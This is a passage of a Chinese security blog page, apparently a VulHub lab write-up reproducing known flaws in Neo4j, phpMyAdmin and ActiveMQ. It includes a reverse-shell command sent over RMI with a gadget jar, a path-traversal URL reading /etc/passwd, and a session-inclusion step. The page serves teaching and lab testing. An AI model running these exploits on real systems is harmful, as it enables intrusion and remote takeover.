@@ -1,0 +1,808 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.27.0" theme-name="Stellar" theme-version="1.27.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>VulHub-杂项漏洞复现 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="总字符数: 10.80K                代码: 3.25K, 文本: 3.19K               预计阅读时间: 28 分钟            Neo4j Shell Server 反序列化漏洞(CVE-2021-34371)漏洞概述Neo4j是一个开源图数据库管理系统. 在Neo4j 3.4.18及以前,如果开启了Neo4j Shell接口,攻击者将可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulHub-杂项漏洞复现">
+<meta property="og:url" content="https://jiangjiyue.github.io/2023/05/03/fe16a42b/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="总字符数: 10.80K                代码: 3.25K, 文本: 3.19K               预计阅读时间: 28 分钟            Neo4j Shell Server 反序列化漏洞(CVE-2021-34371)漏洞概述Neo4j是一个开源图数据库管理系统. 在Neo4j 3.4.18及以前,如果开启了Neo4j Shell接口,攻击者将可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210201855318.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210201941168.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211230567.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211234679.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211235788.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211237333.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211237328.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221733669.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221734981.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221735270.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221736445.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402081917102.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221742681.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221745666.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221817323.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221822193.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221851453.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221854125.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402081917821.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221926830.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210231137588.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210231137363.png">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210231139644.png">
+<meta property="article:published_time" content="2023-05-03T12:29:10.000Z">
+<meta property="article:modified_time" content="2024-02-09T08:13:36.000Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Nday">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="VulHub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210201855318.png">
+  
+  
+  
+  <meta name="keywords" content="Nday,渗透测试,漏洞利用,VulHub">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.27.0">
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+<body>
+
+<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div></header>
+
+<div class="nav-area">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="导航" href="/sites/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="更多" href="/tools/" style="color:#d55afa"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12S6.477 2 12 2s10 4.477 10 10" opacity=".5"/><path fill="currentColor" d="M12.75 9a.75.75 0 0 0-1.5 0v2.25H9a.75.75 0 0 0 0 1.5h2.25V15a.75.75 0 0 0 1.5 0v-2.25H15a.75.75 0 0 0 0-1.5h-2.25z"/></svg></a></nav>
+</div>
+<div class="widgets">
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">专栏：VulHub</span></div><div class="widget-body"><a class="item" href="/2022/10/18/55971a3e/"><span class="title">VulHub-Weblogic漏洞复现</span></a><a class="item" href="/2022/10/20/16f1e4f4/"><span class="title">VulHub-Spring漏洞复现</span></a><a class="item" href="/2023/03/07/a2dd2e70/"><span class="title">VulHub-Atlassian_Confluence漏洞复现</span></a><a class="item" href="/2023/03/08/cc894391/"><span class="title">VulHub-Atlassian_Jira漏洞复现</span></a><a class="item" href="/2023/03/09/5cba5df7/"><span class="title">VulHub-Django漏洞复现</span></a><a class="item" href="/2023/03/10/73f4594f/"><span class="title">VulHub-Drupal漏洞复现</span></a><a class="item" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item" href="/2023/04/01/6eb0a2c0/"><span class="title">VulHub-Gitlab漏洞复现</span></a><a class="item" href="/2023/04/03/30a0d618/"><span class="title">VulHub-Jboss漏洞复现</span></a><a class="item" href="/2023/04/05/8b1917af/"><span class="title">VulHub-Log4j漏洞复现</span></a><a class="item" href="/2023/04/06/30a0d618/"><span class="title">VulHub-H2_DataBase漏洞复现</span></a><a class="item" href="/2023/04/15/5458db23/"><span class="title">VulHub-Nexus漏洞复现</span></a><a class="item" href="/2023/04/20/5458db23/"><span class="title">VulHub-Shiro漏洞复现</span></a><a class="item" href="/2023/04/22/8b1ccd63/"><span class="title">VulHub-Solr漏洞复现</span></a><a class="item" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item active" href="/2023/05/03/fe16a42b/"><span class="title">VulHub-杂项漏洞复现</span><svg class="active-icon" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M21 11.098v4.993c0 3.096 0 4.645-.734 5.321c-.35.323-.792.526-1.263.58c-.987.113-2.14-.907-4.445-2.946c-1.02-.901-1.529-1.352-2.118-1.47a2.225 2.225 0 0 0-.88 0c-.59.118-1.099.569-2.118 1.47c-2.305 2.039-3.458 3.059-4.445 2.945a2.238 2.238 0 0 1-1.263-.579C3 20.736 3 19.188 3 16.091v-4.994C3 6.81 3 4.666 4.318 3.333C5.636 2 7.758 2 12 2c4.243 0 6.364 0 7.682 1.332C21 4.665 21 6.81 21 11.098" opacity=".5"/><path fill="currentColor" d="M9 5.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5z"/></svg></a></div></widget>
+
+<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span><a class="cap-action" id="rss" title="Subscribe" href="/atom.xml"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M5 21q-.825 0-1.412-.587T3 19q0-.825.588-1.412T5 17q.825 0 1.413.588T7 19q0 .825-.587 1.413T5 21m13.5 0q-.65 0-1.088-.475T16.9 19.4q-.275-2.425-1.312-4.537T12.9 11.1q-1.65-1.65-3.762-2.687T4.6 7.1q-.65-.075-1.125-.512T3 5.5q0-.65.45-1.062t1.075-.363q3.075.275 5.763 1.563t4.737 3.337q2.05 2.05 3.338 4.738t1.562 5.762q.05.625-.363 1.075T18.5 21m-6 0q-.625 0-1.075-.437T10.85 19.5q-.225-1.225-.787-2.262T8.65 15.35q-.85-.85-1.888-1.412T4.5 13.15q-.625-.125-1.062-.575T3 11.5q0-.65.45-1.075t1.075-.325q1.825.25 3.413 1.063t2.837 2.062q1.25 1.25 2.063 2.838t1.062 3.412q.1.625-.325 1.075T12.5 21"/></svg></a></div><div class="widget-body fs14"><a class="item title" href="/2024/11/04/fe2980d6/"><span class="title">CS-ShellCode加载器</span></a><a class="item title" href="/2023/03/11/247b757/"><span class="title">VulHub-Fastjson漏洞复现</span></a><a class="item title" href="/2023/04/28/76971e68/"><span class="title">VulHub-Tomcat漏洞复现</span></a><a class="item title" href="/2024/07/05/dd58c5ed/"><span class="title">应急响应之Webshell流量分析</span></a><a class="item title" href="/2024/10/27/77c80f0f/"><span class="title">CS-C语言总结</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue/" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="javaScript:hud.toast('你在听🎵啦啦啦~');" rel="noopener noreferrer"><i class="fa-solid fa-music"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javaScript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" id="menu" href="/topic">专栏</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/2022/10/18/55971a3e/">VulHub</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2023-05-03T12:29:10.000Z">2023-05-03</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-02-09T08:13:36.000Z">2024-02-09</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>VulHub-杂项漏洞复现</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><div class="tag-plugin grid" bg="card" style="grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));"><div class="cell" style="">
+    <p>总字符数: 10.80K </p>
+    </div>
+    <div class="cell" style="">
+    <p>代码: 3.25K, 文本: 3.19K</p>
+    </div>
+    <div class="cell" style="">
+    <p>预计阅读时间: 28 分钟</p>
+    </div>
+    </div>
+
+<h2 id="Neo4j-Shell-Server-反序列化漏洞-CVE-2021-34371"><a href="#Neo4j-Shell-Server-反序列化漏洞-CVE-2021-34371" class="headerlink" title="Neo4j Shell Server 反序列化漏洞(CVE-2021-34371)"></a>Neo4j Shell Server 反序列化漏洞(CVE-2021-34371)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Neo4j是一个开源图数据库管理系统.</p>
+<p>在Neo4j 3.4.18及以前,如果开启了Neo4j Shell接口,攻击者将可以通过RMI协议以未授权的身份调用任意方法,其中<code>setSessionVariable</code>方法存在反序列化漏洞.因为这个漏洞并非RMI反序列化,所以不受到Java版本的影响.</p>
+<p>在Neo4j 3.5及之后的版本,Neo4j Shell被Cyber Shell替代.</p>
+<p><strong>利用版本:</strong></p>
+<ul>
+<li>Neo4j &lt;&#x3D; 3.4.18</li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>如果你使用Linux或OSX系统,可以执行如下命令启动一个Neo4j 3.4.18:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TARGET_IP=&lt;your-ip&gt; docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>其中,环境变量<code>TARGET_IP</code>需要制定靶场环境的IP地址.</p>
+<p>如果你是Windows系统,请直接修改<code>docker-compose.yml</code>,指定<code>TARGET_IP</code>环境变量的值.</p>
+<p>服务启动后,访问<code>http://your-ip:7474</code>即可查看到Web管理页面,但我们需要攻击的是其1337端口,这个端口是Neo4j Shell端口,使用RMI协议通信.</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210201855318.png" data-fancybox="true"/></div></div>
+
+<p>下载Java RMI客户端,集成基于Rhino的<a target="_blank" rel="noopener" href="https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/vulhub/rhino_gadget-neo4j-fatjar.jar">Gadget</a>,发送RMI请求:YOU-BASE64-ENCODE为反弹shell的base64编码后的东西前面用到过好多次了</p>
+<p><code>java -jar rhino_gadget-1.0-SNAPSHOT-fatjar.jar rmi://受害机IP:1337 &quot;bash -c &#123;echo,YOU-BASE64-ENCODE&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210201941168.png" data-fancybox="true"/></div></div>
+
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>升级到Neo4j 3.4.19及以上版本</li>
+</ul>
+<h2 id="phpmyadmin-4-8-1-远程文件包含漏洞-CVE-2018-12613"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞-CVE-2018-12613" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)"></a>phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p><strong>利用版本:</strong></p>
+<ul>
+<li><p>4.8.0</p>
+</li>
+<li><p>4.8.1</p>
+</li>
+</ul>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境启动后,访问<code>http://103.116.46.7:8080</code>. phpmyadmin 是”config”模式,所以我们可以直接登录</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211230567.png" data-fancybox="true"/></div></div>
+
+<p>访问<code>http://103.116.46.7:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>,可见<code>/etc/passwd</code>被读取,说明文件包含漏洞存在</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211234679.png" data-fancybox="true"/></div></div>
+
+<p>使用方式也比较简单,可以执行一下<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code>,然后查看自己的sessionid(中phpMyAdmin的值),然后包含session文件即可</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211235788.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211237333.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210211237328.png" data-fancybox="true"/></div></div>
+
+
+
+<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>升级到最新版phpmyadmin</li>
+</ul>
+<h2 id="ActiveMQ-反序列化漏洞-CVE-2015-5254"><a href="#ActiveMQ-反序列化漏洞-CVE-2015-5254" class="headerlink" title="ActiveMQ 反序列化漏洞(CVE-2015-5254)"></a>ActiveMQ 反序列化漏洞(CVE-2015-5254)</h2><h3 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Apache ActiveMQ是美国阿帕奇(Apache)软件基金会所研发的一套开源的消息中间件,它支持Java消息服务、集群、Spring Framework等.</p>
+<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞,该漏洞源于程序没有限制可在代理中序列化的类.远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码.</p>
+<h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境运行后,将监听61616和8161两个端口.其中61616是工作端口,消息在这个端口进行传递;8161是Web管理页面端口.</p>
+<p>使用浏览器直接访问activemq,查看是否部署完毕</p>
+<p><a target="_blank" rel="noopener" href="http://103.116.46.7:8161/admin/">http://103.116.46.7:8161/admin/</a> (默认的用户名&#x2F;密码为admin&#x2F;admin)</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210221733669.png" data-fancybox="true"/></div></div>
+
+<p>漏洞利用过程如下:</p>
+<ol>
+<li>构造(可以使用ysoserial)可执行命令的序列化对象</li>
+<li>作为一个消息,发送给目标61616端口</li>
